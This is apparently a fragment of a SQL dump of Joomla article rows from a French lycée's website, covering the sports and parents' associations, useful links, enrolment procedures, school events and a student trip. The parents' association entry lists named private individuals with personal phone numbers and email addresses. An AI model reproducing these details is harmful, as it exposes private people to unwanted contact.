(36, 74, 'Association sportive', 'association-sportive', '', '<p> </p>\r\n<p> </p>\r\n<p style="color: #000000;">L''association sportive propose aux élèves du lycée, les activités suivantes :<br /> <br /> <span style="font-style: italic;"> Natation</span></p>\r\n<p style="font-style: italic; color: #000000;">Volley-ball</p>\r\n<p style="font-style: italic; color: #000000;">Tennis</p>\r\n<p style="font-style: italic; color: #000000;">Musculation</p>\r\n<p style="font-style: italic; color: #000000;">Badminton</p>\r\n<p style="font-style: italic; color: #000000;">Foot en salle</p>\r\n<p style="font-style: italic; color: #000000;">Basket ball</p>\r\n<p style="font-style: italic; color: #000000;">Tennis de table</p>\r\n<p style="color: #000000;"><br /> Les activités et compétitions ont lieu le mercredi après-midi à partir de 12h30, la natation de 12h30 à 13h30.</p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"><strong>Natation</strong></p>\r\n<p style="color: #000000;">Participation assidue des élèves inscrits. L''entraînement est basé essentiellement sur un approfondissement de la technique individuelle et une préparation aux différents examens (option bac, concours professorat E.P.S.).</p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"><strong>Volley-ball</strong></p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"><strong>Tennis</strong></p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"><strong>Badminton</strong></p>\r\n<p style="color: #000000;">Activité pratiquée dans un but compétitif (U.N.S.S.) ou de loisir.</p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"><strong>Musculation</strong></p>\r\n<p style="color: #000000;">Programme individualisé défini en fonction de chaque élève suivant son attente.</p>\r\n<p> </p>', '', -2, 0, 0, 12, '2012-10-29 16:14:09', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2012-10-29 16:14:09', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 1, '', '', 1, 0, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(37, 75, 'Association de parents d''élèves', 'association-de-parents-d-eleves', '', '<p style="text-align: left;" align="center"><a href="http://www.fcpe.asso.fr/" target="_blank"><br /> </a><span class="st">Une des deux plus grandes <em>associations</em> de <em>parents d''élèves</em> en France.</span></p>\r\n', '\r\n<p style="color: #000000;" align="center"><br /><a href="http://www.fcpe.asso.fr/" target="_blank"><img src="http://www.lms.ens-cachan.fr/fcpe.gif" border="0" alt="fcpe" style="border: 0px solid;" /></a></p>\r\n<p align="center"><strong>Présidente</strong></p>\r\n<p align="center"><span>Mme CHURAQUI Françoise</span></p>\r\n<p align="center"><span>tél : 06.99.55.04.72</span></p>\r\n<p align="center"><span>courriel : FREUCHU@AOL.COM</span></p>\r\n<p align="center"><span>  </span></p>\r\n<p align="center"><span> </span></p>\r\n<p align="center"><strong>Vice-présidente</strong></p>\r\n<p align="center"><span>Mme ROUBACKA Sonia</span></p>\r\n<p align="center"><span>tél : 06.62.05.98.64</span></p>\r\n<p align="center"><span>courriel :  SONIA.ROUBACKA@FREE.FR</span></p>\r\n<p align="center"><span> </span></p>\r\n<p align="center"><span> </span></p>\r\n<p align="center"><strong>Secrétaire</strong></p>\r\n<p align="center"><span>Mme LECLERC Catherine</span></p>\r\n<p align="center"><span>courriel : CATHERINE.LECLERC@CITROEN.COM </span></p>\r\n<p align="center"><span style="line-height: 1.3em;"> </span></p>\r\n<p align="center"><span> </span></p>\r\n<p align="center"><strong>Trésorière</strong></p>\r\n<p align="center"><span>Mme BALDUENA Nancie</span></p>\r\n<p align="center"><span>courriel : NANCY.BALDUENA@LAPOSTE.NET</span></p>', -2, 0, 0, 12, '2012-10-29 16:14:36', 390, '', '2013-03-14 16:52:47', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:14:36', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 11, 0, 1, '', '', 1, 92, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(38, 76, 'Liens', 'liens', '', '<p align="center"><a href="http://www.ac-creteil.fr/" target="_blank">Académie de Créteil</a></p>\r\n<p> </p>\r\n<p align="center"><br /> <a href="http://www.ac-creteil.fr/" target="_blank"><img src="http://www.lms.ens-cachan.fr/images/interface/academie_creteil.gif" border="0" width="68" height="38" /></a></p>\r\n<p> </p>\r\n<p align="center">__________________________</p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.cidj.com/" target="_blank">CIDJ</a></p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.cidj.com/" target="_blank"><img src="http://www.lms.ens-cachan.fr/images/interface/cidj.gif" border="0" width="62" height="29" /> </a></p>\r\n<p> </p>\r\n<p align="center">__________________________</p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center"><a href="http://orientation.ac-creteil.fr/cio-lhaylesroses/" target="_blank"><span style="color: blue;">CIO de l''Haye-Les-Roses</span></a></p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.ac-creteil.fr/saio/cio94/lhay/welcome.html" target="_blank"><img src="http://www.lms.ens-cachan.fr/images/interface/cio.gif" border="0" width="68" height="34" /></a></p>\r\n<p> </p>\r\n<p align="center">__________________________</p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.crous-creteil.fr/" target="_blank">CROUS de Créteil</a></p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center"><a target="_blank"><span style="color: white;">__</span></a><a href="http://www.crous-creteil.fr/" target="_blank"><span style="color: white;"><img src="http://www.lms.ens-cachan.fr/images/interface/crous.gif" border="0" width="64" height="45" /></span></a></p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center">__________________________</p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.education.gouv.fr/" target="_blank">Ministère de l''Éducation nationale</a></p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.education.gouv.fr/" target="_blank"><img src="http://www.lms.ens-cachan.fr/images/interface/education_gouv.gif" border="0" width="55" height="40" /> </a></p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.education.gouv.fr/" target="_blank"><br /> </a></p>\r\n<p> </p>\r\n<p align="center">__________________________</p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.onisep.fr/onisep-portail/portal/group/gp" target="_blank"><span style="color: blue;">ONISEP</span></a></p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.onisep.fr/onisep-portail/portal/group/gp" target="_blank"><img src="http://www.lms.ens-cachan.fr/images/interface/onisep.gif" border="0" width="67" height="20" /></a></p>\r\n<p> </p>\r\n<p align="center">__________________________</p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.ia94.ac-creteil.fr/personnel.htm" target="_blank">SIAM (Personnels administratifs, Professeurs: Mutations, résultats, informations, ...)<br /> </a></p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.ac-creteil.fr/rectorat/mutations/" target="_blank"><img src="http://www.lms.ens-cachan.fr/images/interface/creteil_infoadmin.gif" border="0" width="67" height="38" /> </a></p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p> </p>\r\n<p align="center">__________________________</p>\r\n<p> </p>\r\n<p align="center"><a href="http://www.europe-education-formation.fr/erasmus.php" target="_blank"><span style="color: blue;">Erasmus</span><br /> </a></p>\r\n<p> </p>\r\n<p align="center"><img src="http://www.lms.ens-cachan.fr/images/erasmus.jpg" border="0" width="114" height="57" /></p>\r\n<p> </p>', '', -2, 0, 0, 2, '2012-10-29 16:15:03', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2012-10-29 16:15:03', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 2, '', '', 1, 8, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(41, 80, 'seconde homogène', 'seconde-homogene', '', '<h2>Seconde homogène</h2>\r\n<p>La demande d''inscription en seconde homogène s''effectue :<br /><br /> - en  complétant le dossier téléchargeable <a href="http://www.lms.ens-cachan.fr/brochures%20pdf/dossier%20_inscription_2ndespe.pdf">ici.</a><br /><br /> - puis en le rapportant au lycée.</p>', '', -2, 0, 0, 14, '2012-10-29 18:55:30', 390, '', '2012-11-06 15:36:40', 390, 0, '0000-00-00 00:00:00', '2012-10-29 18:55:30', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 6, 0, 8, '', '', 1, 149, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(42, 81, 'BTS, CPGE, DCG   ', 'bts-cpge-dcg', '', '<h2>BTS, CPGE, DCG </h2>\r\n<p>Si vous êtes scolarisé en Terminale, si vous êtes titulaire du Baccalauréat ou d''un diplôme équivalent et que vous souhaitez intégrer une première année de BTS, de classe préparatoire, ou de DCG, vous entrez dans la procédure Admission Post-Bac 2012.<br /><br />Vous devez donc obligatoirement, vous connecter sur :  <br /><a href="www.admission-postbac.org%20%20">www.admission-postbac.org  </a><br /><br />Tout(e) candidat(e) à une des formations non disponible(s) sur ce site peut s''adresser au Rectorat de l''Académie où se trouve la formation à laquelle il souhaiterait s''inscrire, de façon à s''informer sur la procédure à suivre.<br /><br />Pour celles de Créteil :    <br />Rectorat de Créteil<br />Division de l’Enseignement Supérieur<br />4, rue Georges Enesco<br />94010 CRETEIL</p>', '', -2, 0, 0, 14, '2012-10-29 18:57:54', 390, '', '2012-11-06 15:35:17', 390, 0, '0000-00-00 00:00:00', '2012-10-29 18:57:54', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 6, 0, 7, '', '', 1, 207, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(43, 82, 'DCG 2ème et 3ème année   ', 'dcg-2eme-et-3eme-annee', '', '<h2>DCG 2ème et 3ème année  </h2>\r\n<p>Pour les titulaires d''un BTS C.G.O ou d''un DUT G.E.A, le dossier de candidature sera téléchargeable ici <strong>prochainement</strong> (document au  format PDF).</p>\r\n<p>Vous devez faire parvenir ce dossier au secrétériat du chef  d''établissement au plus tard le 30 avril 2012.</p>', '', -2, 0, 0, 14, '2012-10-29 18:58:34', 390, '', '2012-11-06 15:41:24', 390, 0, '0000-00-00 00:00:00', '2012-10-29 18:58:34', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 5, 0, 6, '', '', 1, 207, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(44, 83, 'Conseillères en ESF', 'conseilleres-en-esf', '', '<h2>Conseillères en ESF</h2>\r\n<p>Dossiers Conseillères en Economie Sociale et Familiale<br />(Titulaires ou préparant le BTS ESF)</p>\r\n<p><br />Adresser une demande par courrier, en joignant une enveloppe timbrée libellée à vos noms et adresse. <br /><br /><br /></p>', '', -2, 0, 0, 14, '2012-10-29 18:59:17', 390, '', '2016-04-01 09:32:16', 390, 0, '0000-00-00 00:00:00', '2012-10-29 18:59:17', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 6, 0, 5, '', '', 1, 161, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(45, 86, 'Calendrier 2013-2014', 'calendrier-2013-2014', '', '<p> </p>\r\n<p>Le calendrier de cette année est disponible :</p>\r\n<p>http://www.lms.ens-cachan.fr/rentree2013.pdf</p>', '', -2, 0, 0, 15, '2012-10-29 19:11:16', 390, '', '2013-11-06 16:51:56', 390, 0, '0000-00-00 00:00:00', '2012-10-29 19:11:16', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 10, 0, 6, '', '', 1, 113, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(53, 94, 'Venez retirer vos diplômes (BAC et BTS)', 'venez-retirer-vos-diplomes-bac-et-bts', '', '<p>Les diplômes du BAC et du BTS pour la session 2013, sont à retirer au bureau 4 de 9h à 12h et de 13h à 16h.<br />Les diplômes seront disponibles jusqu''au 24 janvier 2014.</p>', '', -2, 0, 0, 15, '2013-11-11 13:29:07', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2013-11-11 13:29:07', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 0, '', '', 1, 38, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(54, 95, 'Équipe de direction', 'equipe-direction', '', '<p>Notre lycée est marqué par la grande implication des professeurs et de l''ensemble des personnels qui sont très attachés à la réussite des élèves. Les résultats sont supérieurs eu égaux aux moyennes académiques et nationales. La vie dans l''établissement est sereine, grâce à une réelle exigence concernant l''assiduité, le respect mutuel et le travail mais aussi grâce à l''attention bienveillante portée aux situations individuelles de nos élèves et étudiants.</p>\r\n<p> </p>\r\n<p> </p>', '', -2, 0, 0, 7, '2014-01-05 23:40:21', 390, '', '2014-01-05 23:45:42', 390, 0, '0000-00-00 00:00:00', '2014-01-05 23:40:21', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 2, 0, 2, '', '', 1, 85, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(46, 87, 'Conseils de classe pré-Bac', 'conseils-de-classe-pre-bac', '', '<p><a href="http://www.lms.ens-cachan.fr/CCpreBac2012T1.pdf">Cliquez ici </a>pour consulter les dates et salles des conseils de classe pré-bac.</p>', '', -2, 0, 0, 15, '2012-10-29 19:14:44', 390, '', '2013-04-05 14:23:45', 390, 0, '0000-00-00 00:00:00', '2012-10-29 19:14:44', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"1","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"1","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"0","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 9, 0, 5, '', '', 1, 44, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(47, 88, 'FSE 2012-2013', 'fse-2012-2013', '', '<p style="text-align: center;"><img src="http://www.lms.ens-cachan.fr/fse.jpeg" border="0" alt="" style="width: 199px; height: 237px;" /></p>\r\n<p align="left">Lors de sa séance du 09/10/2012, le Foyer Socio-Educatif a reconduit son bureau.</p>\r\n<div id="page">\r\n<div id="contenu">\r\n<p align="left">Le but du FSE est de rendre la vie lycéenne plus agréable en organisant diverses actions.</p>\r\n<p id="test" align="left">Cette année scolaire, il prend part entre autres :</p>\r\n<p align="left">-à un voyage d''intégration pour les nouveaux arrivants en septembre.</p>\r\n<p align="left">-à un voyage au ski, un voyage en Allemagne et un voyage en Angleterre</p>\r\n</div>\r\n</div>\r\n<p align="left">-pour les Terminales, fin mai, à un séjour de révision</p>\r\n<p align="left">-si possible, comme l''an passé, à un bal de promotion</p>\r\n<p align="left">Toutes les bonnes volontés sont bienvenues, en particulier pour les financements, par exemple :</p>\r\n<p align="left">-tenues de vestiaires</p>\r\n<p align="left">-ventes de gâteaux</p>\r\n<p align="left">-achat des photos de classe</p>', '', -2, 0, 0, 15, '2012-10-29 19:15:00', 390, '', '2016-06-15 13:05:05', 390, 0, '0000-00-00 00:00:00', '2012-10-29 19:15:00', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 4, 0, 4, '', '', 1, 98, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(50, 91, 'Les sections de BTS', 'les-sections-de-bts', '', '<div align="center"><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/fiche%20web%20%20am.pdf" target="_blank"><strong>Analyses de Biologie Médicale</strong></a> <a href="http://www.lms.ens-cachan.fr/brochures%20pdf/fiche%20web%20%20am.pdf" target="_blank"><strong>Assistant de Manager</strong></a></div>\r\n<div align="center"><a href="pdf/FICHE%20WEB%20%20BANQUE.pdf" target="_blank"><strong>Banque (Marché des particuliers)</strong></a></div>\r\n<div align="center"><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/fiche%20web%20%20commerce%20international.pdf" target="_blank"><strong>Commerce international</strong></a></div>\r\n<div align="center"><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/fiche%20web%20%20cgo.pdf" target="_blank"><strong>Comptabilité et Gestion des Organisations</strong></a></div>\r\n<div align="center"><strong><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/fiche%20web%20%20esf.pdf" target="_blank">Économie sociale et familiale</a></strong></div>\r\n<div align="center"><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/SLAM.pdf" target="_blank"><strong>Informatique - SIO - Logiciels et Applications Métiers</strong></a><strong>  </strong></div>\r\n<div align="center"><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/SISR.pdf" target="_blank"><strong>Informatique - SIO - Systèmes et Réseaux</strong></a><strong>  <br /></strong></div>', '', -2, 0, 0, 7, '2013-03-14 13:18:25', 390, '', '2016-06-14 11:13:45', 390, 0, '0000-00-00 00:00:00', '2013-03-14 13:18:25', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 3, 0, 0, '', '', 1, 136, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(48, 89, 'Remise des diplômes du Baccalauréat', 'remise-des-diplomes-du-baccalaureat', '', '<p><span style="font-family: Monotype Corsiva; font-size: medium;">Le <strong>Lycée MAXIMILIEN SORRE</strong> a le plaisir de vous inviter à </span><span style="font-family: Monotype Corsiva; font-size: xx-large;">      </span> </p>\r\n<p style="color: #000000;" align="center"><span style="font-family: Monotype Corsiva; font-size: x-large;">la remise des diplômes du baccalauréat 2012.</span></p>\r\n<p> </p>\r\n<p style="color: #000000;"><span style="font-family: Monotype Corsiva; font-size: medium;">                                                                 </span></p>\r\n<p> </p>\r\n<p style="color: #000000;" align="center"><span style="font-family: Monotype Corsiva; font-size: medium;"><strong>Le JEUDI 15 NOVEMBRE 2012 à 18h30</strong></span></p>\r\n<p> </p>\r\n<p style="color: #000000;" align="center"><span style="font-family: Monotype Corsiva; font-size: medium;">au Hall Villon à l''ENS de Cachan.</span> </p>\r\n<p> </p>\r\n<p align="center"><a name="_Hlt338335796" style="color: #000000;"></a><span style="font-family: Monotype Corsiva; font-size: medium;"><span style="color: #000000;">Veuillez nous confirmer votre présence avant </span><span style="color: #000000; text-decoration: underline;">le Vendredi 26 Octobre (en indiquant votre Nom et Prénom)</span><span style="color: #000000;"> à l''adresse mail suivante</span> :</span></p>\r\n<p><span style="font-family: Monotype Corsiva; font-size: medium;"><strong>LMS</strong></span><a href="mailto:remisebac2012@hotmail.fr"><span style="font-family: Monotype Corsiva; font-size: medium;"><strong>remisebac2012@hotmail.fr</strong></span></a></p>', '', 2, 0, 0, 15, '2012-10-29 19:15:20', 390, '', '2012-10-29 19:18:28', 390, 0, '0000-00-00 00:00:00', '2012-10-29 19:15:20', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 2, 0, 3, '', '', 1, 7, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(49, 90, 'Demi-journée banalisée du 15 novembre', 'demi-journee-banalisee-du-15-novembre', '', '<p style="color: #000000;">Madame, Monsieur, <br />  <br />  </p>\r\n<p style="color: #000000;">Afin de définir le futur projet d''établissement, une demi-journée de concertation avec l''ensemble des personnels est prévue au Lycée Maximilien Sorre le jeudi 15 novembre 2012.</p>\r\n<p style="color: #000000;">Les cours seront suspendus de 13h30 à 18h30. </p>\r\n<p style="color: #000000;">Nous vous remercions de votre compréhension. <br />  </p>\r\n<p style="color: #000000;">Je vous prie d''agréer, madame, monsieur, l''expression de mes sentiments les meilleurs. <br />  </p>\r\n<p style="color: #000000; text-align: right;">Le proviseur, Guy Thomas</p>', '', 2, 0, 0, 15, '2012-10-29 19:15:52', 390, '', '2012-10-29 19:18:16', 390, 0, '0000-00-00 00:00:00', '2012-10-29 19:15:52', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 2, 0, 2, '', '', 1, 24, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(51, 92, 'VOYAGE A LIVERPOOL', 'voyage-a-liverpool', '', '<p style="text-align: center;"><strong>Les étudiants de SIO2, AM1 et CI sont rentrés de Liverpool !</strong></p>\r\n<p style="text-align: center;">Voici quelques photos :</p>\r\n<p style="text-align: center;"><img src="images/The%20Yellow%20Submarine.jpg" border="0" alt="The Yellow Submarine.jpg - 64.95 Ko" width="218" height="159" /></p>\r\n<p style="text-align: center;"><em>The Yellow Submarine des Beatles !</em></p>\r\n<p style="text-align: center;"> </p>\r\n<p style="text-align: center;">Le voyage a eu lieu du 25 mars au 30 mars.</p>\r\n<p style="text-align: center;">Il y a eu deux visites d''universités, <a class="l" href="http://www.le.ac.uk/"><em>Leicester </em></a><span class="l"><em>et </em></span><a class="l" href="http://www.le.ac.uk/"></a><a class="l" href="http://www.google.fr/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;sqi=2&amp;ved=0CDMQFjAA&amp;url=http%3A%2F%2Fwww.hud.ac.uk%2F&amp;ei=9OBeUYGxGs2xhAeqwoGwCA&amp;usg=AFQjCNHSpK6Xe68ERPh4DO4oPwv0SgACDw&amp;bvm=bv.44770516,d.d2k"><em>Huddersfield </em></a><span class="l"><em>  </em>et nous avons également visité la<strong> ville de York</strong> (magnifique ! ). </span></p>\r\n<p style="text-align: center;"><span class="l"> </span></p>', '', -2, 0, 0, 15, '2013-04-05 14:46:19', 390, '', '2016-04-01 10:20:30', 390, 0, '0000-00-00 00:00:00', '2013-04-05 14:46:19', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 6, 0, 1, '', '', 1, 96, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(55, 96, 'Les personnels', 'personnels', '', '<p>Notre lycée est marqué par la grande implication des professeurs et de l''ensemble des personnels qui sont très attachés à la réussite des élèves. Les résultats sont supérieurs eu égaux aux moyennes académiques et nationales. La vie dans l''établissement est sereine, grâce à une réelle exigence concernant l''assiduité, le respect mutuel et le travail mais aussi grâce à l''attention bienveillante portée aux situations individuelles de nos élèves et étudiants.</p>', '', -2, 0, 0, 7, '2014-01-05 23:51:35', 390, '', '2014-01-05 23:52:46', 390, 0, '0000-00-00 00:00:00', '2014-01-05 23:51:35', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 2, 0, 1, '', '', 1, 171, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
